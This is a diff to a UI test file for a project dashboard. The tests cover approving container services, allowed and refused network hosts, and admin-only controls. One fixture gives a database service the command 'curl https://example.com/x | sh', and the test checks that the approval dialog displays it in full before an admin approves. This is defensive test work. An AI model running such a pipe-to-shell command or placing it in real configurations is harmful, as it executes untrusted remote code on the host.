@@ -27,6 +27,7 @@ const view = {
   description: 'The money path: checkout, refunds and the ledger.',
   goals: '',
   repositories: [],
+  allowedHosts: ['gitlab.acme.com'],
   week: {
     runs: 4,
     ended: 4,
@@ -95,7 +96,15 @@ describe('the projects list', () => {
     const environment = {
       repository: 'https://github.com/acme/payments',
       devcontainer: '.devcontainer/devcontainer.json',
-      services: [{ name: 'db', image: 'postgres:16', environment: {}, volumes: [] }],
+      services: [
+        {
+          name: 'db',
+          image: 'postgres:16',
+          command: ['sh', '-c', 'curl https://example.com/x | sh'],
+          environment: { POSTGRES_PASSWORD: 'dev' },
+          volumes: [{ name: 'pgdata', target: '/var/lib/postgresql/data' }],
+        },
+      ],
       problems: ['mail: left out, it asks for privileged'],
       readAt: new Date().toISOString(),
       hash: 'c'.repeat(64),
@@ -118,6 +127,10 @@ describe('the projects list', () => {
     expect(screen.getByText('mail: left out, it asks for privileged')).toBeTruthy();
     await user.click(screen.getByRole('button', { name: 'Approve services' }));
     const dialog = await screen.findByRole('dialog', { name: 'Approve these services?' });
+    // What runs, in full: the command most of all, which runs whatever it says.
+    expect(within(dialog).getByText('sh -c curl https://example.com/x | sh')).toBeTruthy();
+    expect(within(dialog).getByText('POSTGRES_PASSWORD=dev')).toBeTruthy();
+    expect(within(dialog).getByText('pgdata → /var/lib/postgresql/data')).toBeTruthy();
     await user.click(within(dialog).getByRole('button', { name: 'Approve services' }));
     expect(
       calls.find((call) => call.route === 'POST /api/projects/p1/environment/approve')?.body,
@@ -280,6 +293,43 @@ describe('a project', () => {
       description: 'The money path.',
     });
     expect(await screen.findByText(/The money path/)).toBeTruthy();
+  });
+
+  it('lets an admin allow a host the runs were refused, and add the public registries', async () => {
+    const refused = {
+      hosts: [{ host: 'pypi.org', port: 443, count: 3, lastAt: new Date().toISOString() }],
+    };
+    const { user, calls } = open('/projects/p1', {
+      'GET /api/projects/p1': view,
+      'GET /api/projects/p1/refused-hosts': refused,
+      'PATCH /api/projects/p1': { ...view, allowedHosts: ['gitlab.acme.com', 'pypi.org'] },
+    });
+    const allowed = await screen.findByRole('list', { name: 'Allowed hosts' });
+    expect(within(allowed).getByText('gitlab.acme.com')).toBeTruthy();
+    const asked = await screen.findByRole('list', { name: 'Refused hosts' });
+    expect(within(asked).getByText(/3 times, last/)).toBeTruthy();
+    // In one click, from the row itself.
+    await user.click(within(asked).getByRole('button', { name: 'Allow pypi.org' }));
+    expect(calls.find((call) => call.route === 'PATCH /api/projects/p1')?.body).toEqual({
+      allowedHosts: ['gitlab.acme.com', 'pypi.org'],
+    });
+
+    await user.click(screen.getByRole('button', { name: 'Add host' }));
+    const dialog = await screen.findByRole('dialog', { name: 'Add a host' });
+    await user.click(within(dialog).getByRole('button', { name: 'Add public package registries' }));
+    const sent = calls.filter((call) => call.route === 'PATCH /api/projects/p1').at(-1)?.body as {
+      allowedHosts: string[];
+    };
+    expect(sent.allowedHosts).toEqual(
+      expect.arrayContaining(['registry.npmjs.org', 'proxy.golang.org']),
+    );
+  });
+
+  it('shows a member the hosts, with nothing to change', async () => {
+    open('/projects/p1', { 'GET /api/projects/p1': view }, member);
+    await screen.findByRole('list', { name: 'Allowed hosts' });
+    expect(screen.queryByRole('button', { name: 'Add host' })).toBeNull();
+    expect(screen.queryByRole('button', { name: 'Actions for gitlab.acme.com' })).toBeNull();
   });
 
   it('lets an admin delete a project after asking, and goes back to the list', async () => {
